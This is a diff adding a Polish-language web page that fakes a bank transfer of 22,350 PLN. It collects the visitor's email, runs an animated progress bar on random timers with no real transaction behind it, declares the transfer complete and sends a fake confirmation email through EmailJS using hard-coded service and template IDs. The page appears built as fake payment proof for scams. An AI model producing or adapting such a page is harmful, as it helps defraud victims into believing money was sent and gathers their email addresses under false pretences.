@@ -1,0 +1,331 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Trwa transfer - 22350 PLN</title>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<style>
+body {
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  margin: 0;
+  background: #f5f5f5;
+  padding-bottom: 60px;
+  max-width: 100vw;
+  overflow-x: hidden;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+}
+
+.progress-container {
+  width: 80%;
+  max-width: 600px;
+  background: #fff;
+  padding: 30px;
+  border-radius: 12px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+.email-form {
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+.email-input {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #e0e0e0;
+  border-radius: 6px;
+  font-size: 16px;
+  margin-bottom: 10px;
+}
+
+.submit-button {
+  background: #10B981;
+  color: white;
+  border: none;
+  padding: 12px 24px;
+  border-radius: 6px;
+  font-size: 16px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+
+.submit-button:hover {
+  background: #059669;
+}
+
+.transfer-info {
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+.amount {
+  font-size: 24px;
+  font-weight: 600;
+  color: #1f2937;
+  margin-bottom: 8px;
+}
+
+.status {
+  color: #6b7280;
+  font-size: 0.95rem;
+}
+
+.progress-bar {
+  width: 100%;
+  height: 12px;
+  background: #e0e0e0;
+  border-radius: 6px;
+  overflow: hidden;
+  position: relative;
+  margin-bottom: 10px;
+}
+
+.progress {
+  width: 0%;
+  height: 100%;
+  background: linear-gradient(90deg, #10B981, #34D399);
+  border-radius: 6px;
+  transition: width 0.3s ease;
+}
+
+.percentage {
+  text-align: center;
+  font-size: 18px;
+  font-weight: 500;
+  color: #1f2937;
+  margin-top: 10px;
+}
+
+.notification {
+  position: fixed;
+  top: 20px;
+  right: -400px;
+  background: #fff;
+  padding: 16px 24px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  transition: right 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+  z-index: 1000;
+  opacity: 0;
+  visibility: hidden;
+}
+
+.notification.show {
+  right: 20px;
+  opacity: 1;
+  visibility: visible;
+}
+
+.notification-icon {
+  color: #10B981;
+}
+
+.notification-text {
+  color: #1f2937;
+  font-size: 0.95rem;
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.02); }
+  100% { transform: scale(1); }
+}
+
+.progress-container {
+  animation: pulse 2s infinite ease-in-out;
+}
+
+.hidden {
+  display: none;
+}
+</style>
+</head>
+<body>
+
+<div class="progress-container">
+  <div class="email-form" id="emailForm">
+    <input type="email" id="userEmail" class="email-input" placeholder="Wprowadź swój email, aby śledzić transfer" required>
+    <button onclick="startTransfer()" class="submit-button">Rozpocznij transfer</button>
+  </div>
+
+  <div class="transfer-info hidden" id="transferInfo">
+    <div class="amount">22 350 PLN</div>
+    <div class="status">Trwa transfer na konto główne</div>
+  </div>
+  
+  <div class="progress-bar hidden" id="progressBarContainer">
+    <div class="progress" id="progress"></div>
+  </div>
+  <div class="percentage hidden" id="percentage">0%</div>
+</div>
+
+<div class="notification" id="notification">
+  <svg class="notification-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+  </svg>
+  <span class="notification-text">Transfer zakończony pomyślnie! Sprawdź swoją skrzynkę email, aby uzyskać potwierdzenie.</span>
+</div>
+
+<script>
+// Inicjalizacja EmailJS
+(function() {
+  emailjs.init("doBjgwoKqkKpLc4oz"); // Zastąp swoim kluczem publicznym EmailJS
+})();
+
+// Konfiguracja transferu
+const transferConfig = {
+  id: 'transfer_22350PLN_' + new Date().toISOString().split('T')[0],
+  amount: 22350,
+  currency: 'PLN',
+  startTime: null,
+  currentProgress: 0,
+  isCompleted: false,
+  userEmail: null
+};
+
+const progress = document.getElementById('progress');
+const percentage = document.getElementById('percentage');
+const notification = document.getElementById('notification');
+const emailForm = document.getElementById('emailForm');
+const transferInfo = document.getElementById('transferInfo');
+const progressBarContainer = document.getElementById('progressBarContainer');
+
+function startTransfer() {
+  const emailInput = document.getElementById('userEmail');
+  const email = emailInput.value;
+  
+  if (!email || !email.includes('@')) {
+    alert('Proszę wprowadzić prawidłowy adres email');
+    return;
+  }
+  
+  transferConfig.userEmail = email;
+  emailForm.classList.add('hidden');
+  transferInfo.classList.remove('hidden');
+  progressBarContainer.classList.remove('hidden');
+  percentage.classList.remove('hidden');
+  
+  initializeTransfer();
+}
+
+function sendConfirmationEmail() {
+  const templateParams = {
+    to_email: transferConfig.userEmail,
+    amount: transferConfig.amount,
+    currency: transferConfig.currency,
+    transfer_id: transferConfig.id,
+    transfer_date: new Date().toLocaleDateString()
+  };
+
+  emailjs.send(
+    'service_yri9zqt', // Zastąp swoim Service ID
+    'template_tkjqilq', // Zastąp swoim Template ID
+    templateParams
+  ).then(
+    function(response) {
+      console.log('Email wysłany pomyślnie:', response);
+    },
+    function(error) {
+      console.log('Błąd podczas wysyłania emaila:', error);
+    }
+  );
+}
+
+function saveTransferState() {
+  localStorage.setItem('transferState', JSON.stringify(transferConfig));
+}
+
+function loadTransferState() {
+  const savedState = localStorage.getItem('transferState');
+  if (savedState) {
+    const parsedState = JSON.parse(savedState);
+    if (parsedState.id === transferConfig.id) {
+      return parsedState;
+    }
+  }
+  return null;
+}
+
+function updateProgressBar(width) {
+  progress.style.width = width + '%';
+  percentage.textContent = width + '%';
+  transferConfig.currentProgress = width;
+  saveTransferState();
+}
+
+function incrementProgress() {
+  if (transferConfig.currentProgress >= 100) {
+    transferConfig.isCompleted = true;
+    saveTransferState();
+    document.querySelector('.progress-container').style.animation = 'none';
+    showNotification();
+    sendConfirmationEmail();
+    return;
+  }
+  
+  transferConfig.currentProgress += 1;
+  updateProgressBar(transferConfig.currentProgress);
+  
+  const randomDelay = Math.floor(Math.random() * 50) + 30;
+  setTimeout(incrementProgress, randomDelay);
+}
+
+function showNotification() {
+  setTimeout(() => {
+    notification.classList.add('show');
+    
+    setTimeout(() => {
+      notification.classList.remove('show');
+    }, 6000);
+  }, 300);
+}
+
+function initializeTransfer() {
+  const savedState = loadTransferState();
+  
+  if (savedState) {
+    transferConfig.currentProgress = savedState.currentProgress;
+    transferConfig.isCompleted = savedState.isCompleted;
+    transferConfig.startTime = savedState.startTime;
+    transferConfig.userEmail = savedState.userEmail;
+    
+    if (transferConfig.isCompleted) {
+      updateProgressBar(100);
+      document.querySelector('.progress-container').style.animation = 'none';
+      return;
+    }
+    
+    updateProgressBar(transferConfig.currentProgress);
+    setTimeout(incrementProgress, 500);
+  } else {
+    transferConfig.startTime = new Date().toISOString();
+    saveTransferState();
+    setTimeout(incrementProgress, 500);
+  }
+}
+
+window.addEventListener('beforeunload', () => {
+  saveTransferState();
+});
+
+// Sprawdzanie zapisanego stanu przy ładowaniu
+const savedState = loadTransferState();
+if (savedState && savedState.userEmail) {
+  document.getElementById('userEmail').value = savedState.userEmail;
+  if (savedState.currentProgress > 0) {
+    startTransfer();
+  }
+}
+</script>
+
+</body>
+</html>
